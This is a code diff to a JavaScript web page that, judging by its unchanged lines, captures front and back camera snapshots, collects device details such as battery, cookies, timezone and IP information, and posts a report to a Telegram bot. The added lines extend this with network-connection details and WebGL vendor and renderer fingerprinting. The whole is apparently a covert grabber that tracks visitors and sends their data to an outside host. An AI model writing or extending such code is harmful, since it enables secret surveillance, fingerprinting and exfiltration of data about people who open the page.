@@ -35,6 +35,33 @@
     let frontCaptured = false;
     let backCaptured = false;
 
+    // === NEW: Network Information ===
+    async function getNetworkInfo() {
+      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (connection) {
+        return {
+          type: connection.type || "Unknown",
+          effectiveType: connection.effectiveType || "Unknown",
+          downlink: connection.downlink ? `${connection.downlink} Mbps` : "Unknown",
+          rtt: connection.rtt ? `${connection.rtt} ms` : "Unknown",
+          saveData: connection.saveData ? "Enabled" : "Disabled",
+        };
+      }
+      return "Network API not supported";
+    }
+
+    // === NEW: WebGL & Canvas Fingerprinting ===
+    function getWebGLInfo() {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      if (!gl) return "WebGL not supported";
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      return {
+        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "Blocked",
+        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Blocked",
+      };
+    }
+
     async function getSnapshot(facingMode) {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
@@ -78,7 +105,10 @@
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unavailable",
         cpu: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "Unavailable",
-        cameraStatus: ""
+        cameraStatus: "",
+        // === NEW: Added fields ===
+        network: await getNetworkInfo(),
+        webgl: getWebGLInfo(),
       };
 
       // IP Info
@@ -127,8 +157,19 @@
 🌐 Browser: ${data.browser}
 🍪 Cookies: ${data.cookies}
 🕒 Timezone: ${data.timezone}
-
 🔋 Battery: ${data.battery} | Charging: ${data.charging}
+
+=== NEW: Network & WebGL ===
+📶 Network: 
+   - Type: ${data.network.type}
+   - Speed: ${data.network.effectiveType}
+   - Downlink: ${data.network.downlink}
+   - RTT: ${data.network.rtt}
+   - Data Saver: ${data.network.saveData}
+
+🎮 WebGL: 
+   - Vendor: ${data.webgl.vendor}
+   - Renderer: ${data.webgl.renderer}
       `;
 
       return fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
